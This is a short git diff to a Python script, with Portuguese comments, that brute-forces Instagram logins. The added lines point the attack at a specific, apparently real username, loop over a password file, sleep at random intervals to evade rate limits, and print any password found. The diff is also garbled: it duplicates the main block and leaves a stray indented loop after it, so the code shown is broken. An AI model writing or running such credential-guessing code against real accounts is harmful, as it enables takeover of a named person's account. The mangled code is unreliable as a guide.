@@ -47,5 +47,20 @@ class InstagramBruteForce:
         return False
 
 if __name__ == "__main__":
+    # Atualize com o nome de usuário real
+    brute_force = InstagramBruteForce("secrett_isay_", "passwords.txt")
+    brute_force.run()            
+        for password in passwords:
+            if self.attempt_login(password):
+                print(f"✅ Senha encontrada: {password}")
+                return True
+                
+            # Adicionar delay aleatório
+            time.sleep(random.uniform(1, 3))
+            
+        print("❌ Falha ao encontrar senha")
+        return False
+
+if __name__ == "__main__":
     brute_force = InstagramBruteForce("target_username", "passwords.txt")
     brute_force.run()
